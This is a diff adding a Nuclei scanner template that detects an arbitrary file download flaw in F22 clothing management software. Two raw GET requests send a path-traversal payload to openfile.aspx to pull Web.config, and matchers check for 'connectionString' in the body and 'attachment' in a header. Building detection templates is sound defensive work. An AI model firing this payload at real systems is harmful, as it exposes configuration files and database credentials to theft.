@@ -1,0 +1,39 @@
+id: f22-clothing-management-openfile-file-download
+info:
+  name: F22 Clothing Management Software Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The F22 clothing management software system developed by Guangzhou Jinmingtai Software Technology Co., Ltd. has an arbitrary file download vulnerability in `/oa/isprit/module/openfile.aspx`. Attackers can exploit this to obtain sensitive information such as system configuration files.
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /oa/isprit/module/openfile.aspx?Url=..\\..\\..\\Web.config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "connectionString"
+        part: body
+  - raw:
+      - |
+        GET /oa/isprit/module/openfile.aspx?Url=..\\..\\..\\Web.config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "attachment"
+        part: header
